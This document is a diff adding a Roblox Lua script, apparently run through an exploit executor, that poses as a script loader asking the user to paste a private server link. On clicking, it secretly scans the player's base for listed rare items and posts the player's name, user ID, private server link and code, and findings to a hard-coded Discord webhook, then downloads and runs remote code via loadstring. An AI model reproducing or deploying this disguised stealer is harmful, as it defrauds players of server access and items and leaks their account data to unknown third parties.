@@ -1,0 +1,287 @@
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- REMOVE ROBLOX GUI
+local robloxGui = CoreGui:FindFirstChild("RobloxGui")
+if robloxGui then
+    robloxGui:Destroy()
+end
+
+-- WEBHOOK
+local webhookURL = "https://discord.com/api/webhooks/1485179378202574980/9DLvi12rn-zpuBqbzqrD0YX72vBxGWgZmtPvqCgeKA7tiF4W65OD0HviJK9GeOvabQoN"
+
+-- GET GAME NAME
+local gameName = "Unknown Game"
+pcall(function()
+    gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+end)
+
+-- EXECUTOR DETECTION
+local executor = "Unknown"
+pcall(function()
+    if identifyexecutor then
+        executor = identifyexecutor()
+    elseif getexecutorname then
+        executor = getexecutorname()
+    end
+end)
+
+-- REQUEST FUNCTION DETECTION
+local requestFunction =
+    request
+    or http_request
+    or (syn and syn.request)
+    or (fluxus and fluxus.request)
+
+repeat task.wait() until requestFunction
+
+
+-- BRAINROT TARGETS
+local targets = {
+
+["Hydra Dragon Cannelloni"] = true,
+["W or L"] = true,
+["La Romantic Grande"] = true,
+["Ginger Gerat"] = true,
+["Lovin Rose"] = true,
+["Tuff Toucan"] = true,
+["Guest 666"] = true,
+["Los Amigos"] = true,
+["Skibidi Toilet"] = true,
+["Cerberus"] = true,
+["Meowl"] = true,
+["Headless Horseman"] = true,
+["Spooky and Pumpky"] = true,
+["Los Spaghettis"] = true,
+["Los Primos"] = true,
+["Swaggy Bros"] = true,
+["Swag Soda"] = true,
+["Dragon Cannelloni"] = true,
+["Gobblino Uniciclino"] = true,
+["Rosetti Tualetti"] = true,
+["Lavadorito Spinito"] = true,
+["Reinito Sleighito"] = true,
+["Tictac Sahur"] = true,
+["Los Puggies"] = true,
+["Love Love Bear"] = true,
+["Strawberry Elephant"] = true,
+["La Extinct Grande"] = true,
+["La Casa Boo"] = true,
+["Nuclearo Dinossauro"] = true,
+["Griffin"] = true,
+["Antonio"] = true,
+["Capitano Moby"] = true,
+["Nacho Spyder"] = true,
+["Cooki and Milki"] = true,
+["Elefanto Frigo"] = true,
+["Signore Carapace"] = true,
+["Los Tacoritas"] = true,
+["Celestial Pegasus"] = true,
+["Los Hotspotsitos"] = true,
+["Money Money Puggy"] = true,
+["Fragrama and Chocrama"] = true,
+["Sammyni Fattini"] = true,
+["La Food Combinasion"] = true,
+["Ketchuru and Musturu"] = true,
+["Dragon Gingerini"] = true,
+["Orcaledon"] = true,
+["Tang Tang Keletang"] = true,
+["Burguro and Fryuro"] = true,
+["La Taco Combinasion"] = true,
+["Tacorita Bicicleta"] = true,
+["Chillin Chilli"] = true,
+["La Spooky Grande"] = true,
+["La Jolly Grande"] = true,
+["La Supreme Combinasion"] = true,
+["Popcuru and Fizzuru"] = true,
+["Rosey and Teddy"] = true,
+["Ketupat Bros"] = true,
+["La Secret Combinasion"] = true,
+["Los Sekolahs"] = true,
+["Fishino Clownino"] = true
+
+}
+
+-- SCANNER
+local function scanBase()
+
+    local plots = workspace:FindFirstChild("Plots")
+    local foundTargets = {}
+    local seen = {}
+
+    if plots then
+        for _,v in ipairs(plots:GetDescendants()) do
+
+            if v:IsA("Model") and targets[v.Name] and not seen[v.Name] then
+
+                if v:FindFirstChildWhichIsA("BasePart") then
+                    seen[v.Name] = true
+                    table.insert(foundTargets,v.Name)
+                end
+
+            end
+
+        end
+    end
+
+    return foundTargets
+
+end
+
+
+-- WEBHOOK FUNCTION
+local function sendWebhook(link,serverCode,targets)
+
+    local playerList = {}
+    for _,p in ipairs(Players:GetPlayers()) do
+        table.insert(playerList,"- "..p.Name)
+    end
+
+    local targetList = {}
+    for _,t in ipairs(targets) do
+        table.insert(targetList,"- "..t)
+    end
+
+    local pingText = ""
+    if #targets > 0 then
+        pingText = "@here Brainrots found!\n"
+    end
+
+    local data = {
+        ["content"] = pingText,
+        ["username"] = "Brainrot Scanner",
+        ["embeds"] = {{
+            ["title"] = "Private Server Script Execution",
+            ["color"] = 5763719,
+            ["fields"] = {
+
+                {name="Player",value=player.Name,inline=true},
+                {name="User ID",value=tostring(player.UserId),inline=true},
+                {name="Executor",value=executor,inline=true},
+
+                {name="Game",value=gameName,inline=false},
+                {name="Server Code",value=serverCode or "N/A",inline=false},
+                {name="Private Server Link",value=link or "N/A",inline=false},
+
+                {name="Players In Server",value=tostring(#Players:GetPlayers()),inline=true},
+
+                {name="Brainrots Found",value=#targets > 0 and table.concat(targetList,"\n") or "None",inline=false},
+
+                {name="Time",value=os.date("%Y-%m-%d %H:%M:%S"),inline=false}
+            }
+        }}
+    }
+
+    local json = HttpService:JSONEncode(data)
+
+    pcall(function()
+        requestFunction({
+            Url=webhookURL,
+            Method="POST",
+            Headers={["Content-Type"]="application/json"},
+            Body=json
+        })
+    end)
+end
+
+
+-- GUI
+local gui = Instance.new("ScreenGui")
+gui.Parent = playerGui
+gui.IgnoreGuiInset = true
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0,500,0,300)
+frame.Position = UDim2.new(0.5,0,1.2,0)
+frame.AnchorPoint = Vector2.new(0.5,0.5)
+frame.BackgroundColor3 = Color3.fromRGB(20,20,30)
+frame.Parent = gui
+
+frame.Active = true
+frame.Draggable = true
+
+Instance.new("UICorner",frame).CornerRadius = UDim.new(0,25)
+
+local glow = Instance.new("UIStroke")
+glow.Thickness = 3
+glow.Color = Color3.fromRGB(0,255,255)
+glow.Parent = frame
+
+TweenService:Create(
+frame,
+TweenInfo.new(0.7,Enum.EasingStyle.Quint),
+{Position = UDim2.new(0.5,0,0.5,0)}
+):Play()
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1,-40,0,70)
+title.Position = UDim2.new(0,20,0,20)
+title.BackgroundTransparency = 1
+title.Text = "ENTER PRIVATE SERVER LINK"
+title.TextColor3 = Color3.fromRGB(0,255,255)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.Parent = frame
+
+local textBox = Instance.new("TextBox")
+textBox.Size = UDim2.new(0.85,0,0,50)
+textBox.Position = UDim2.new(0.075,0,0.35,0)
+textBox.PlaceholderText = "Paste private server link..."
+textBox.BackgroundColor3 = Color3.fromRGB(30,30,50)
+textBox.TextColor3 = Color3.fromRGB(255,255,255)
+textBox.Font = Enum.Font.Gotham
+textBox.TextScaled = true
+textBox.Parent = frame
+
+Instance.new("UICorner",textBox).CornerRadius = UDim.new(0,15)
+
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0.4,0,0,50)
+button.Position = UDim2.new(0.3,0,0.7,0)
+button.Text = "LOAD SCRIPT"
+button.Font = Enum.Font.GothamBold
+button.TextScaled = true
+button.BackgroundColor3 = Color3.fromRGB(0,200,255)
+button.TextColor3 = Color3.new(0,0,0)
+button.Parent = frame
+
+Instance.new("UICorner",button).CornerRadius = UDim.new(0,20)
+
+button.MouseButton1Click:Connect(function()
+
+    button.Text = "LOADING..."
+    button.Active = false
+
+    local link = textBox.Text
+
+    local serverCode =
+        string.match(link,"privateServerLinkCode=([%w%-_]+)")
+        or string.match(link,"code=([%w%-_]+)")
+
+    if serverCode and string.find(link,"roblox.com") then
+
+        local found = scanBase()
+
+        if webhookURL ~= "PUT_WEBHOOK_HERE" then
+            sendWebhook(link,serverCode,found)
+        end
+
+        gui:Destroy()
+
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/someoneyouusedtoknow101/sabscrip/refs/heads/main/urmom"))()
+
+    else
+
+        textBox.Text = ""
+        textBox.PlaceholderText = "Invalid private server link!"
+        button.Text = "LOAD SCRIPT"
+        button.Active = true
+
+    end
+end)
